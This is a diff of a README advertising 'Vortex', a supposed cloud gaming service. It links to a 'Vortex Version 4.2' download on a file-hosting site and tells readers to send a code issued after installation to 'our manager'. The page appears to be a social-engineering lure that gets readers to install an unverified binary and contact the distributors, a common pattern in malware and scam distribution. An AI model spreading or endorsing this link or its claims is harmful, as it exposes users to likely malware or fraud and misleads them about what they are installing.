@@ -13,10 +13,11 @@
 ## Vortex revolutionary tools and technologies provide the most comfortable and affordable cloud gaming.
 ### Don't waste money on gaming hardware. You can play all demanding PC games on any device you choose. Potato PC? Mac Computer? Android phone? It’s easy with Vortex, the cloud gaming solution! Play your favorite games online on all your devices with just one subscription!
 #
+-------------
 
 ## Example of code issuance after installation.
 ![alt-text](https://i.ibb.co/HPQFFhF/Example.jpg" ).
-## ♀️Send this code our manager 💁‍♀️.
+## Send this code our manager 💁‍♀️.
 #
 
 ## [⚡Vortex Version 4.2] (https://mega.nz/file/pC5THIzR#yWxIp_gZ37nh21VxsK0Y95fuXkG884EYeICj9ggEM04):
